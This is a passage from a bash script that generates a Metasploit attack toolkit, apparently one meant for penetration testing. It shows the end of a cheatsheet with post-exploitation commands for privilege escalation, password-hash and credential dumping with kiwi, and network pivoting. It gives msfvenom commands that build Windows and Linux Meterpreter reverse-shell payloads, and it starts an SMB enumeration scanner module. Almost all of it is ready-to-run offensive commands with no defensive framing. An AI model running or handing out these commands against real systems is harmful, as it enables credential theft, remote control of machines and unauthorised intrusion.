── POST ──
  sessions -i 1; getsystem; hashdump
  load kiwi; creds_all
  run autoroute -s 10.0.0.0/24        # Pivot
── MSFVENOM ──
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o p.exe
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o p.elf
CHEAT
CHTEOMAIN

    log "msf-run.sh, c2-run.sh, msf-ai.sh, msf-cheatsheet.sh written"


    # ──────────────────────────────────────────────────────────────────
    # MODULES: scanner/* (7 files)
    # ──────────────────────────────────────────────────────────────────
    cat > "$D/modules/scanner/smb/smb_scanner.sh" << 'EOF'
#!/usr/bin/env bash
# Description: SMB enumeration — version, shares, users, MS17-010 check
TARGET="${1:-}"; [[ -z "$TARGET" ]] && { echo "Usage: bash smb_scanner.sh <RHOSTS>"; echo "  bash smb_scanner.sh 192.168.1.0/24"; exit 1; }
echo -e "\n=== SMB SCANNER — $TARGET ===\n"
echo "[*] SMB Version:"; echo "  use auxiliary/scanner/smb/smb_version; set RHOSTS $TARGET; set THREADS 10; run"
echo "[*] SMB Shares:"; echo "  use auxiliary/scanner/smb/smb_enumshares; set RHOSTS $TARGET; set ShowFiles true; run"
echo "[*] SMB Users:"; echo "  use auxiliary/scanner/smb/smb_enumusers; set RHOSTS $TARGET; run"
